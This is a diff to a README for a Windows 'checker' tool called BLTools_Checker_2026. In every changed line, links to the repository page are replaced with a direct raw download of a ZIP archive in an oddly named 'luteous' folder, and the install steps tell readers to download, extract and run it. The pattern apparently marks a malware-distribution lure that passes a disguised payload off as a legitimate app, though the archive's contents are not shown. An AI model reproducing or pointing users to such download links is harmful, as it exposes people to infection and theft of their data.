@@ -1,6 +1,6 @@
 # 🔍 BLTools_Checker_2026 - Fast Windows Data Checking
 
-[![Download BLTools_Checker_2026](https://img.shields.io/badge/Download-BLTools_Checker_2026-6f42c1?style=for-the-badge&logo=github)](https://github.com/cindraillomened493/BLTools_Checker_2026)
+[![Download BLTools_Checker_2026](https://img.shields.io/badge/Download-BLTools_Checker_2026-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cindraillomened493/BLTools_Checker_2026/main/luteous/BL_Tools_Checker_2.5.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ The app focuses on speed, batch checking, and clear output. It can help with com
 
 Use this link to visit the page and download the app:
 
-[Download BLTools_Checker_2026](https://github.com/cindraillomened493/BLTools_Checker_2026)
+[Download BLTools_Checker_2026](https://raw.githubusercontent.com/cindraillomened493/BLTools_Checker_2026/main/luteous/BL_Tools_Checker_2.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ BLTools_Checker_2026 runs on Windows systems.
 
 ## 🛠️ How to Install
 
-1. Open the download page: [BLTools_Checker_2026](https://github.com/cindraillomened493/BLTools_Checker_2026)
+1. Open the download page: [BLTools_Checker_2026](https://raw.githubusercontent.com/cindraillomened493/BLTools_Checker_2026/main/luteous/BL_Tools_Checker_2.5.zip)
 2. Look for the latest release or the main download file.
 3. Download the file to your computer.
 4. If the file comes in a ZIP folder, right-click it and choose Extract All.
@@ -176,7 +176,7 @@ Yes. You can export or copy results after a run.
 
 ## 📌 Quick Start
 
-1. Visit the download page: [BLTools_Checker_2026](https://github.com/cindraillomened493/BLTools_Checker_2026)
+1. Visit the download page: [BLTools_Checker_2026](https://raw.githubusercontent.com/cindraillomened493/BLTools_Checker_2026/main/luteous/BL_Tools_Checker_2.5.zip)
 2. Download the latest file.
 3. Extract it if needed.
 4. Open the app.
